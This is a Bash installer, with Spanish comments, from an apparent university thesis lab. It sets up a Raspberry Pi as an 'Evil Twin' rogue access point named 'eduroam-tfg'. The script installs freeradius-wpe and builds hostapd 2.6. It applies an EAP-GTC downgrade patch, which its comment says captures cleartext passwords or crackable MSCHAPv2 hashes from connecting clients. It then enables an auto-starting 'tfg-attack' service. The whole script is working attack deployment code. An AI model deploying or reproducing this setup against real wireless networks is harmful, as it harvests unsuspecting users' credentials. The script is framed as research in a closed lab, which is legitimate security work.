#!/bin/bash
# install.sh: Despliegue automatizado del laboratorio Evil Twin eduroam
#
# Convierte una Raspberry Pi 5 con Raspberry Pi OS 64-bit recién instalado en
# un laboratorio reproducible con dos puntos de acceso (PatataWiFi_mgmt en wlan0
# + eduroam-tfg en wlan1) y servicios systemd encadenados de arranque automático.
#
# Uso:           sudo ./install.sh
# Re-ejecutable: sí, usa patch --forward y comprobaciones de estado para ser idempotente.

set -euo pipefail

# ====================== Variables ======================
REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PATATAWIFI_DIR="/root/patatawifi"
FREERADIUS_DIR="/etc/freeradius-wpe/3.0"

HOSTAPD_TARBALL_URL="https://w1.fi/releases/hostapd-2.6.tar.gz"
HOSTAPD_TARBALL_SHA256="01526b90c1d23bec4b0f052039cc4456c2fd19347b4d830d1d58a0a6aea7117d"
PATATAWIFI_UPSTREAM="https://github.com/jesux/PatataWiFiEnterprise.git"
KALI_GPG_KEY_URL="https://archive.kali.org/archive-key.asc"
KALI_GPG_FILE="/etc/apt/trusted.gpg.d/kali.gpg"

TOTAL_STEPS=11

# ====================== Helpers ======================
step() { printf '\n[%d/%d] %s\n' "$1" "$TOTAL_STEPS" "$2"; }
ok()   { printf '       [OK] %s\n'  "$1"; }
note() { printf '       [..] %s\n'  "$1"; }
fail() { printf '       [FAIL] %s\n' "$1" >&2; exit 1; }

verify_sha256() {
  local file="$1" expected="$2" actual
  actual=$(sha256sum "$file" | awk '{print $1}')
  if [ "$actual" != "$expected" ]; then
    fail "sha256 mismatch en $file (esperado $expected, obtenido $actual)"
  fi
}

apply_patch_idempotent() {
  # Aplica un patch con --forward. Si ya está aplicado, lo detecta vía --reverse --dry-run.
  local patch="$1" dir="$2" name
  name="$(basename "$patch")"
  if (cd "$dir" && patch -p1 --reverse --dry-run --silent < "$patch") 2>/dev/null; then
    note "patch ya aplicado: $name"
    return 0
  fi
  if ! (cd "$dir" && patch -p1 --forward --silent < "$patch"); then
    fail "patch falló: $name"
  fi
}

# ====================== Pre-flight ======================
if [ "$(id -u)" -ne 0 ]; then
  echo "ERROR: este script requiere root. Ejecute con sudo." >&2
  exit 1
fi

ARCH="$(uname -m)"
if [ "$ARCH" != "aarch64" ]; then
  echo "AVISO: arquitectura detectada '$ARCH' (validado en aarch64)." >&2
  echo "       Continúo, pero no se garantiza el funcionamiento." >&2
fi

if ! command -v apt-get >/dev/null 2>&1; then
  echo "ERROR: apt-get no encontrado. Se requiere un sistema Debian/Raspberry Pi OS." >&2
  exit 1
fi

cat <<'BANNER'
=================================================================
  TFG Evil Twin · Instalador automático
  Alejandro Cañadas Fleury · Universidad Loyola Andalucía
  Uso educativo en laboratorio cerrado únicamente.
=================================================================
BANNER

# ====================== STEP 1 ======================
step 1 "Actualizar APT e instalar dependencias base"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq --no-install-recommends \
  hostapd dnsmasq build-essential pkg-config \
  libssl-dev libnl-3-dev libnl-genl-3-dev libpcap-dev libdbus-1-dev \
  iw wireless-tools wpasupplicant macchanger iptables nftables net-tools \
  tmux git wget curl ca-certificates gnupg patch \
  firmware-mediatek firmware-brcm80211 \
  python3-dev python3-pip
ok "dependencias base instaladas"

# ====================== STEP 2 ======================
step 2 "Configurar repo Kali rolling con pin de prioridad 50"
if [ ! -s "$KALI_GPG_FILE" ]; then
  note "descargando clave GPG de Kali"
  curl -fsSL "$KALI_GPG_KEY_URL" | gpg --dearmor -o "$KALI_GPG_FILE"
fi
cat > /etc/apt/sources.list.d/kali.list <<EOF
deb [signed-by=$KALI_GPG_FILE] http://http.kali.org/kali kali-rolling main
EOF
cat > /etc/apt/preferences.d/kali <<'EOF'
Package: *
Pin: release o=Kali
Pin-Priority: 50
EOF
apt-get update -qq
ok "repo Kali listo (pin 50 → paquetes Kali NO se instalan automáticamente)"

# ====================== STEP 3 ======================
step 3 "Instalar freeradius-wpe desde Kali rolling"
apt-get install -y -qq -t kali-rolling freeradius-wpe
command -v radiusd >/dev/null || fail "radiusd no disponible tras instalar freeradius-wpe"
ok "freeradius-wpe $(dpkg-query -W -f='${Version}' freeradius-wpe) instalado"

# ====================== STEP 4 ======================
step 4 "Aplicar parches a radiusd.conf y mods-enabled/eap"
apply_patch_idempotent "$REPO_DIR/freeradius-wpe/radiusd.conf.patch" "$FREERADIUS_DIR"
# mods-enabled/eap: en el .deb es symlink a mods-available/eap. Convertir a archivo regular.
if [ -L "$FREERADIUS_DIR/mods-enabled/eap" ]; then
  note "mods-enabled/eap es symlink → copia regular antes de parchear"
  rm "$FREERADIUS_DIR/mods-enabled/eap"
  cp "$FREERADIUS_DIR/mods-available/eap" "$FREERADIUS_DIR/mods-enabled/eap"
fi
apply_patch_idempotent "$REPO_DIR/freeradius-wpe/eap.patch" "$FREERADIUS_DIR"
# Downgrade attack: cambia default_eap_type del bloque peap a GTC para capturar
# passwords en claro de clientes que acepten EAP-GTC. Con fallback automático a
# MSCHAPv2 (hash crackeable offline) si el cliente rechaza GTC vía EAP-NAK.
apply_patch_idempotent "$REPO_DIR/freeradius-wpe/eap-gtc-downgrade.patch" "$FREERADIUS_DIR"
ok "parches FreeRADIUS-WPE aplicados"

# ====================== STEP 5 ======================
step 5 "Bootstrap de certificados FreeRADIUS-WPE"
if [ ! -f "$FREERADIUS_DIR/certs/server.pem" ]; then
  ( cd "$FREERADIUS_DIR/certs" && make bootstrap >/dev/null 2>&1 ) || \
    fail "make bootstrap falló en $FREERADIUS_DIR/certs"
fi
[ -f "$FREERADIUS_DIR/certs/server.pem" ] || fail "server.pem no se generó"
[ -f "$FREERADIUS_DIR/certs/ca.pem" ]     || fail "ca.pem no se generó"
ok "certs/server.pem + certs/ca.pem generados"

# ====================== STEP 6 ======================
step 6 "Clonar PatataWiFiEnterprise y copiar files/ a $PATATAWIFI_DIR"
mkdir -p "$PATATAWIFI_DIR"
TMPCLONE="$(mktemp -d)"
git clone --quiet --depth=1 "$PATATAWIFI_UPSTREAM" "$TMPCLONE/PWE"
# cp -a overwrites; los parches del paso 7 se aplican sobre upstream virgen → idempotente.
cp -a "$TMPCLONE/PWE/files/." "$PATATAWIFI_DIR/"
rm -rf "$TMPCLONE"
chmod +x "$PATATAWIFI_DIR"/*.sh
ok "scripts y configs upstream copiados"

# ====================== STEP 7 ======================
step 7 "Aplicar parches sobre PatataWiFi (3 archivos)"
apply_patch_idempotent "$REPO_DIR/patatawifi-patches/hostapd-freeradius.sh.patch"   "$PATATAWIFI_DIR"
apply_patch_idempotent "$REPO_DIR/patatawifi-patches/patatawifi.conf.patch"         "$PATATAWIFI_DIR"
apply_patch_idempotent "$REPO_DIR/patatawifi-patches/patatawifi-virtual.conf.patch" "$PATATAWIFI_DIR"
ok "parches PatataWiFi aplicados"

# ====================== STEP 8 ======================
step 8 "Descargar y compilar hostapd-2.6 (sha256 verificado)"
if [ ! -x "$PATATAWIFI_DIR/hostapd/hostapd" ]; then
  HOSTAPD_TGZ="$(mktemp --suffix=.tar.gz)"
  note "descargando $HOSTAPD_TARBALL_URL"
  curl -fsSL "$HOSTAPD_TARBALL_URL" -o "$HOSTAPD_TGZ"
  verify_sha256 "$HOSTAPD_TGZ" "$HOSTAPD_TARBALL_SHA256"
  ok "sha256 verificado"

  rm -rf "$PATATAWIFI_DIR/hostapd-2.6"
  tar -xzf "$HOSTAPD_TGZ" -C "$PATATAWIFI_DIR"
  rm -f "$HOSTAPD_TGZ"

  cp "$PATATAWIFI_DIR/hostapd-2.6/hostapd/defconfig" \
     "$PATATAWIFI_DIR/hostapd-2.6/hostapd/.config"
  apply_patch_idempotent "$REPO_DIR/patatawifi-patches/hostapd-2.6-config.patch" \
                         "$PATATAWIFI_DIR/hostapd-2.6"

  note "compilando hostapd con make -j$(nproc) (1-2 min)..."
  make -C "$PATATAWIFI_DIR/hostapd-2.6/hostapd" -j"$(nproc)" hostapd >/dev/null
  cp "$PATATAWIFI_DIR/hostapd-2.6/hostapd/hostapd" "$PATATAWIFI_DIR/hostapd/hostapd"
  chmod +x "$PATATAWIFI_DIR/hostapd/hostapd"
fi
[ -x "$PATATAWIFI_DIR/hostapd/hostapd" ] || fail "binario hostapd no presente"
ok "hostapd compilado ($(stat -c %s "$PATATAWIFI_DIR/hostapd/hostapd") bytes)"

# ====================== STEP 9 ======================
step 9 "Configurar hostapd-mgmt/mgmt.conf y symlink radiuscfg/default"
install -d -m 0755 "$PATATAWIFI_DIR/hostapd-mgmt"
install -m 0644 "$REPO_DIR/hostapd-mgmt/mgmt.conf" "$PATATAWIFI_DIR/hostapd-mgmt/mgmt.conf"
install -d -m 0755 "$PATATAWIFI_DIR/radiuscfg"
if [ ! -L "$PATATAWIFI_DIR/radiuscfg/default" ]; then
  ln -s "$FREERADIUS_DIR" "$PATATAWIFI_DIR/radiuscfg/default"
fi
ok "hostapd-mgmt instalado + radiuscfg/default → $FREERADIUS_DIR"

# ====================== STEP 10 ======================
step 10 "Instalar scripts tfg-*.sh y unidades systemd"
install -m 0755 "$REPO_DIR/scripts/tfg-cleanup.sh" /usr/local/bin/tfg-cleanup.sh
install -m 0755 "$REPO_DIR/scripts/tfg-mgmt.sh"    /usr/local/bin/tfg-mgmt.sh
install -m 0755 "$REPO_DIR/scripts/tfg-attack.sh"  /usr/local/bin/tfg-attack.sh
install -m 0644 "$REPO_DIR/systemd/tfg-cleanup.service" /etc/systemd/system/tfg-cleanup.service
install -m 0644 "$REPO_DIR/systemd/tfg-mgmt.service"    /etc/systemd/system/tfg-mgmt.service
install -m 0644 "$REPO_DIR/systemd/tfg-attack.service"  /etc/systemd/system/tfg-attack.service
systemctl daemon-reload
ok "scripts en /usr/local/bin/ + units en /etc/systemd/system/"

# ====================== STEP 11 ======================
step 11 "Habilitar servicios systemd encadenados"
systemctl enable tfg-cleanup.service tfg-mgmt.service tfg-attack.service >/dev/null 2>&1
ok "tfg-cleanup → tfg-mgmt → tfg-attack arrancarán tras reboot"

# ====================== Verification ======================
echo ""
echo "================================================================="
echo "Verificación final:"
errors=0
for svc in tfg-cleanup tfg-mgmt tfg-attack; do
  state="$(systemctl is-enabled "$svc.service" 2>/dev/null || echo unknown)"
  if [ "$state" = "enabled" ]; then echo "  [OK]   $svc.service enabled"
  else                              echo "  [FAIL] $svc.service estado=$state"; errors=$((errors+1)); fi
done
for f in /root/patatawifi/hostapd/hostapd \
         /usr/sbin/radiusd \
         /etc/freeradius-wpe/3.0/certs/server.pem \
         /root/patatawifi/hostapd-mgmt/mgmt.conf \
         /usr/local/bin/tfg-cleanup.sh \
         /usr/local/bin/tfg-mgmt.sh \
         /usr/local/bin/tfg-attack.sh; do
  if [ -e "$f" ]; then echo "  [OK]   $f"
  else                  echo "  [FAIL] $f no existe"; errors=$((errors+1)); fi
done
echo "================================================================="

if [ $errors -ne 0 ]; then
  echo ""
  echo "Verificación con $errors error(es). Revise los [FAIL] antes de reiniciar." >&2
  exit 1
fi

cat <<'POSTMSG'

  Instalación completa.

  Ejecute:   sudo reboot

  Tras reiniciar (~30 s desde POST), las dos redes estarán al aire:
    · PatataWiFi_mgmt  (gestión,   WPA2-PSK,  canal 1, 172.31.0.0/24)
    · eduroam-tfg      (Evil Twin, WPA2-EAP,  canal 6, 10.0.0.0/24)

  Verificación rápida tras reboot:
    sudo systemctl is-active tfg-cleanup tfg-mgmt tfg-attack
    sudo iw dev wlan0 info
    sudo iw dev wlan1 info
    tail -F /var/log/freeradius-wpe/freeradius-server-wpe.log

POSTMSG
